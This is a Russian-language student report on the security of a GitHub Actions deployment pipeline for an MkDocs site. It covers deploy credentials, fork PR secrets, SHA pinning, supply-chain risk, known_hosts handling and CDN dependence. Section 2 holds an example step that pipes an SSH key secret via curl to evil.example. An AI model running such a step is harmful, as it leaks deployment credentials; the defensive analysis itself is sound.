# Исследовательское задание T4

## T4. Модель доставки и безопасность пайплайна

Разбор сделан по фактическим workflow этого репозитория:

```text
.github/workflows/deploy.yml
.github/workflows/deploy-helios.yml
```

и по двум опубликованным копиям сайта:

```text
https://zaharenkoliza.github.io/mkdocs-lab/
https://se.ifmo.ru/~s335141/mkdocs-lab/
```

Проверки выполнены 28.09.2026.

---

## 1. Способы развёртывания

### 1.1. Push в ветку `gh-pages` (токен workflow)

Типичная схема: `peaceiris/actions-gh-pages` или `git push` в ветку `gh-pages`.

Учётные данные:

- `GITHUB_TOKEN` с правом `contents: write`, либо PAT с `repo`.

Объём прав:

- запись в репозиторий, как минимум в ветку публикации;
- PAT шире: доступ ко всем репозиториям, которые выданы токену, без привязки к одному workflow.

Последствия компрометации:

- подмена опубликованного сайта в `gh-pages`;
- при широком токене ещё и запись в исходные ветки, issues, packages;
- история ветки `gh-pages` выглядит как обычные коммиты, вредоносный HTML можно замаскировать под сборку.

В этом репозитории такой способ не используется.

### 1.2. `upload-pages-artifact` + `deploy-pages`

Так устроен `deploy.yml`.

Учётные данные:

- `GITHUB_TOKEN` с `pages: write` и `id-token: write`;
- отдельный PAT не нужен;
- публикация идёт через OIDC в окружение `github-pages`.

Объём прав:

- выгрузка Pages-артефакта и деплой в GitHub Pages;
- в текущем workflow ещё `contents: read` на checkout;
- ключ Helios в этот workflow не передаётся.

Последствия компрометации:

- подмена содержимого GitHub Pages;
- исходный код в `main` этим токеном не пушится;
- сайт на Helios напрямую не затрагивается.

Ограничение: право `pages: write` есть у любого, кто может менять workflow в `main`. Защита ветки и review важнее, чем выбор action.

### 1.3. `rsync` / `scp` по SSH с отдельным deploy-ключом

Так устроен `deploy-helios.yml`. Секрет:

```text
HELIOS_SSH_KEY
```

Публичная часть ключа лежит в `~/.ssh/authorized_keys` на Helios. Порт: `2222`.

Объём прав:

- всё, что разрешено ключу на аккаунте `s335141`;
- отдельный ключ лучше, чем пароль или личный ключ с ноутбука;
- если ключ без `command=` и без `restrict`, это полноценный SSH в домашний каталог, не только `rsync` в `public_html`.

Последствия компрометации:

- запись и удаление файлов в `public_html` (`--delete` в rsync усиливает ущерб);
- чтение чужих файлов в домашнем каталоге, если ключ это позволяет;
- замена сайта на Helios без доступа к GitHub.

В workflow ключ пишется во временный файл раннера:

```bash
printf '%s\n' "${{ secrets.HELIOS_SSH_KEY }}" > ~/.ssh/helios_key
chmod 600 ~/.ssh/helios_key
```

На GitHub-hosted runner диск после job уничтожается. В логи ключ попадать не должен: GitHub маскирует значение секрета, если оно совпадает побайтно. Перенос ключа в base64 или нарезка на части маскировку ломает.

### 1.4. FTP / SFTP

FTP:

- логин и пароль;
- канал без шифрования, если это обычный порт 21;
- пароль часто даёт весь аккаунт хостинга, не каталог сайта.

Компрометация: перехват пароля на сети, подмена файлов, иногда чтение почты и соседних сайтов на том же аккаунте.

SFTP:

- те же учётные данные, но поверх SSH;
- ближе к варианту 1.3, если используется ключ.

Для Helios в этой работе FTP не применялся: доступ есть по SSH на порту `2222`.

### 1.5. Объектное хранилище по S3 API

Типичные данные:

- Access Key ID и Secret Access Key;
- либо краткоживущие ключи по STS / IAM role (на GitHub Actions это OIDC).

Объём прав зависит от политики. Частая ошибка: ключ с `s3:*` на все бакеты.

Последствия компрометации:

- замена или удаление объектов публичного бакета (сайт);
- при широкой политике ещё другие бакеты и сервисы облака;
- публичный ACL `public-read` на бакет не равен праву записи, но украденный ключ записи как раз и даёт подмену.

В этой лабораторной S3 не подключался.

### Сводка

| Способ | Что хранится | Права | Что ломается при утечке |
|---|---|---|---|
| push в `gh-pages` | `GITHUB_TOKEN` или PAT | запись в git, часто шире Pages | ветка сайта, при PAT ещё репозитории |
| artifact + `deploy-pages` | `GITHUB_TOKEN` + OIDC | Pages, без push в исходники | только GitHub Pages |
| SSH `rsync`/`scp` | приватный ключ | шелл или как минимум файлы пользователя | файлы на Helios, сайт в `public_html` |
| FTP | логин/пароль | обычно весь аккаунт | сайт и, при plaintext, перехват на сети |
| S3 API | ключи облака | по IAM/политике бакета | объекты бакета, при широком ключе облако |

---

## 2. Почему секреты недоступны в `pull_request` из форка

Событие `pull_request` из форка запускает workflow **из непроверенного репозитория**. Автор PR задаёт и YAML, и код, который checkout положит на раннер.

Если бы туда отдали `HELIOS_SSH_KEY`, хватило бы такого шага:

```yaml
run: echo "${{ secrets.HELIOS_SSH_KEY }}" | curl -d @- https://evil.example/
```

Либо тише: ключ уходит в подставной action.

Поэтому GitHub для PR из форка:

- не подставляет repository/environment secrets;
- даёт `GITHUB_TOKEN` только на чтение.

PR из той же репозитории (ветка коллеги с write access) секреты видеть может. Ограничение именно про недоверенный форк.

Текущие workflow подписаны на `push`, не на `pull_request`. Секрет Helios в форк-PR и так не попадёт: job с rsync для чужого PR не стартует. Если позже добавить сборку на PR, деплой и секреты нужно оставлять только на `push` в `main` или на `workflow_run` после ручного approve. `pull_request_target` с checkout кода из форка это тот же класс ошибок: workflow доверенный, код нет, секреты уже есть.

---

## 3. Зачем фиксировать action по SHA, а не по тегу

Тег `v7` или `v4` можно переписать force-push. SHA коммита нельзя подменить без коллизии.

Документация GitHub прямо пишет: pin на полный SHA это единственный сейчас способ считать release action неизменяемым. Тег допустим, только если доверяешь автора, и даже тогда риск остаётся: доступ к репозиторию action позволяет сдвинуть тег.

В этих workflow сейчас теги:

```text
actions/checkout@v7
actions/setup-python@v7
actions/configure-pages@v5
actions/upload-pages-artifact@v4
actions/deploy-pages@v4
```

Это официальные `actions/*`. Риск ниже, чем у случайного Marketplace-action, но тег всё равно подвижный. Для стороннего action (например `peaceiris/actions-gh-pages`) запись должна выглядеть так:

```yaml
uses: peaceiris/actions-gh-pages@4f9cc6602d3f66b9c1088d2ad60ce0cbd2a187ce  # v4.0.0
```

SHA берут с страницы релиза или через `git rev-parse`, не с форка.

Замечание: Dependabot лучше обновляет semver-теги, чем «голый» SHA. Компромисс: SHA плюс комментарий с версией, Dependabot всё равно умеет такие строки двигать.

---

## 4. Supply-chain через action и что будет с сайтом

Цепочка:

1. В workflow есть `uses: some-org/some-action@v1`.
2. У атакующего появляется push в репозиторий action (украденный токен мейнтейнера).
3. Тег `v1` переставляют на коммит, который читает `process.env` и `${{ }}` секреты, уводит их наружу, при необходимости правит файлы перед upload/rsync.
4. Следующий `push` в наш `main` подтягивает уже этот коммит. Свою строку workflow мы не меняли.

Что это даёт на опубликованном сайте:

- в артефакт Pages попадает свой JS (майнер, редирект, подмена формул и таблиц);
- `rsync --delete` заливает ту же подмену на Helios;
- healthcheck с строкой `CONTROL_STRING_STATIC_SITE_2026` это не ловит: строку оставляют, вредоносный код кладут рядом;
- кэш браузера и CDN GitHub Pages разносят копию, пока не пересоберёшь чистым action.

Побочный эффект не про HTML: утекает `HELIOS_SSH_KEY`. Сайт потом можно менять и без GitHub.

Известный случай того же класса: март 2025, `tj-actions/changed-files`. Теги версий переставили на один вредоносный коммит, workflow с тегом, не с SHA, печатали секреты в лог. Репозитории с pin на SHA не исполнили этот коммит.

Защита, которая реально относится к этому проекту:

- не тащить посторонние action без нужды (сейчас все `uses:` из `actions/*`);
- pin по SHA;
- `permissions` по минимуму в каждом workflow (у Helios-файла блок `permissions` сейчас не задан);
- не передавать SSH-ключ в job, где он не нужен (Pages-job ключ уже не видит);
- review изменений `.github/workflows/*`.

---

## 5. `known_hosts` без отключения проверки ключа хоста

Сейчас шаг такой:

```bash
ssh-keyscan -H -p 2222 helios.cs.ifmo.ru >> ~/.ssh/known_hosts
```

`StrictHostKeyChecking` не выключается, это лучше, чем `ssh -o StrictHostKeyChecking=no`. Но `ssh-keyscan` на каждом запуске это Trust On First Use: раннер принимает тот ключ, который ответил **в этот момент**. При MITM в сеть раннера попадёт ключ атакующего, он запишется в `known_hosts`, `scp`/`rsync` отдаст файлы ему.

Как делать:

1. Один раз с доверенной машины снять ключи:

```bash
ssh-keyscan -p 2222 -t rsa,ed25519 helios.cs.ifmo.ru
```

2. Сверить отпечатки с каналом, которому веришь (страница админов ИТМО, коллега, уже проверенный ноутбук):

```bash
ssh-keygen -lf collected_keys
```

3. Положить файл в репозиторий. Ключ хоста не секрет:

```text
ci/helios_known_hosts
```

4. В workflow:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
cp ci/helios_known_hosts ~/.ssh/known_hosts
chmod 644 ~/.ssh/known_hosts

ssh -i ~/.ssh/helios_key \
    -o IdentitiesOnly=yes \
    -o StrictHostKeyChecking=yes \
    -o UserKnownHostsFile=~/.ssh/known_hosts \
    -p 2222 \
    s335141@helios.cs.ifmo.ru \
    'true'
```

Хеширование `ssh-keyscan -H` скрывает имя хоста в файле. Для публичного `helios.cs.ifmo.ru` пользы мало, сверять отпечатки проще по открытой записи `host key`.

Нельзя:

```text
StrictHostKeyChecking=no
UserKnownHostsFile=/dev/null
ssh-keyscan в CI как единственная проверка
```

Первые две строки отключают защиту от подмены хоста полностью.

---

## 6. Сайт без внешних CDN

Проверено по HTML главной страницы GitHub Pages и Helios. Состав внешних URL в `<link>` / `<script>`:

| URL | Роль | Нужен для отрисовки |
|---|---|---|
| `https://cdnjs.cloudflare.com/.../github.min.css` | стили highlight.js, светлая тема | подсветка листингов |
| `https://cdnjs.cloudflare.com/.../github-dark.min.css` | то же, тёмная тема | подсветка в dark |
| `https://cdnjs.cloudflare.com/.../highlight.min.js` | highlight.js 11.8.0 | подсветка листингов |
| `https://www.mkdocs.org/` | ссылка в футере | нет, только клик |
| `site_url` | canonical | нет |

Имитация недоступности CDN:

```bash
curl --resolve cdnjs.cloudflare.com:443:127.0.0.1 \
  https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js
```

Результат: соединение не устанавливается. Сама главная страница при этом отвечает `200`, контрольная строка на месте, поиск (`search/search_index.json`) локальный. Ломается только подсветка кода: CSS/JS highlight.js не загружаются. Тема MkDocs, Bootstrap, Font Awesome и woff2 уже лежат рядом с сайтом. Формула на странице «О работе» это MathML в HTML, MathJax и KaTeX не подключаются.

Шрифты Google в этой теме нет.

### Размеры, байты, 28.09.2026

| Ресурс | Где лежит | Размер, байт |
|---|---|---|
| `index.html` | свой хост | 9228 |
| `css/base.css` | свой хост | 8461 |
| `css/bootstrap.min.css` | свой хост | 235601 |
| `css/fontawesome.min.css` | свой хост | 80795 |
| `css/brands.min.css` | свой хост | 19307 |
| `css/solid.min.css` | свой хост | 572 |
| `css/v4-font-face.min.css` | свой хост | 1736 |
| `js/base.js` | свой хост | 8242 |
| `js/bootstrap.bundle.min.js` | свой хост | 80663 |
| `search/main.js` | свой хост | 3206 |
| `search/search_index.json` | свой хост | 14301 |
| `img/favicon.ico` | свой хост | 1150 |
| `webfonts/fa-solid-900.woff2` | свой хост | 156496 |
| `webfonts/fa-brands-400.woff2` | свой хост | 117372 |
| `webfonts/fa-regular-400.woff2` | свой хост | 25452 |
| `highlight.min.js` | cdnjs | 121107 |
| `github.min.css` | cdnjs | 1309 |
| `github-dark.min.css` | cdnjs | 1315 |

Сумма трёх файлов highlight.js: **123731 байт** (121 КиБ).

Если скопировать их в репозиторий и отдавать со своего хоста, внешние запросы за скриптами/стилями на главной станут нулём. Вес страницы с точки зрения своего origin вырастет на эти же 123731 байт. Суммарный трафик браузера почти не изменится: те же файлы, другой origin. Исчезает зависимость от Cloudflare cdnjs.

Как выключить CDN в MkDocs без смены темы:

```yaml
theme:
  name: mkdocs
  language: ru
  highlightjs: false

extra_css:
  - assets/highlightjs/github.min.css
  - assets/highlightjs/github-dark.min.css

extra_javascript:
  - assets/highlightjs/highlight.min.js
  - assets/highlightjs/init.js
```

`init.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  if (window.hljs) {
    hljs.highlightAll();
  }
});
```

Файлы взять той же версии 11.8.0, что сейчас в HTML, и положить в `docs/assets/highlightjs/`.

Если позже включить Material и `pymdownx.arithmatex` с MathJax с CDN, офлайн-проверка разъедется сильнее: MathJax это уже сотни килобайт или мегабайты, не 121 КиБ. Тогда выгоднее KaTeX локально или тот же MathML, что сейчас.

---

## 7. Что из этого уже есть в проекте и чего нет

Есть:

- официальный Pages-деплой без записи в `gh-pages`;
- отдельный SSH-ключ в Secrets, не в git;
- rsync на Helios;
- healthcheck по HTTP 200 и контрольной строке;
- локальные Bootstrap, Font Awesome, поиск;
- формулы без MathJax.

Нет / слабо:

- pin action по SHA;
- явный `permissions:` у Helios-workflow;
- зафиксированный `known_hosts` в репозитории, сейчас каждый раз `ssh-keyscan`;
- локальная копия highlight.js;
- ограничение SSH-ключа (`restrict`, `command=`, отдельный пользователь только с правом на `public_html`).

---

## 8. Краткий вывод по T4

Для публикации результатов в этом репозитории меньше риск у связки `upload-pages-artifact` + `deploy-pages` на GitHub и отдельного SSH-ключа на Helios, чем у PAT и push в `gh-pages`. FTP для Helios не нужен. S3 имеет смысл, если понадобится свой домен и объектное хранилище, тогда лучше OIDC, не вечный Access Key.

Сайт переживает падение cdnjs: текст, навигация, поиск и формула остаются. Не переживает падение cdnjs подсветка кода. Перенос highlight.js в `docs/assets` закрывает это ценой +121 КиБ на своём хосте.
